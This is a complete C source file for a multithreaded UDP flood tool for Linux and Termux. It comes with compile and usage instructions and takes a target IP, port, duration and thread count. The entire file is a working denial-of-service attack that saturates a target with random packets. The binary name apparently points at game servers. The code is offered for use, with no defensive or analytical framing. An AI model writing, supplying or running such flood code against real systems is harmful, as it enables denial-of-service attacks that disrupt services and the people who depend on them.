// udp_flood.c – High-performance UDP flood for Linux/Android (Termux)
// Compile: gcc -O3 -pthread -o bgmi bgmi.c
// Usage: ./bgmi <IP> <port> <duration_seconds> <threads>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

int sock;
struct sockaddr_in target;
int port;
int duration;
int stop_flag = 0;

void* flood_thread(void* arg) {
    char packet[1024];
    // Fill with random data
    for(int i = 0; i < 1024; i++)
        packet[i] = rand() % 256;
    
    time_t end = time(NULL) + duration;
    while(!stop_flag && time(NULL) < end) {
        sendto(sock, packet, 1024, 0, (struct sockaddr*)&target, sizeof(target));
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if(argc != 5) {
        printf("Usage: %s <IP> <port> <seconds> <threads>\n", argv[0]);
        return 1;
    }
    
    srand(time(NULL));
    char* ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    
    // Create socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock < 0) {
        perror("Socket creation failed");
        return 1;
    }
    
    // Set target
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    if(inet_pton(AF_INET, ip, &target.sin_addr) <= 0) {
        perror("Invalid IP");
        return 1;
    }
    
    printf("Starting UDP flood on %s:%d for %d seconds with %d threads...\n", ip, port, duration, threads);
    
    pthread_t tid[threads];
    for(int i = 0; i < threads; i++)
        pthread_create(&tid[i], NULL, flood_thread, NULL);
    
    sleep(duration);
    stop_flag = 1;
    for(int i = 0; i < threads; i++)
        pthread_join(tid[i], NULL);
    
    close(sock);
    printf("Flood finished.\n");
    return 0;
}
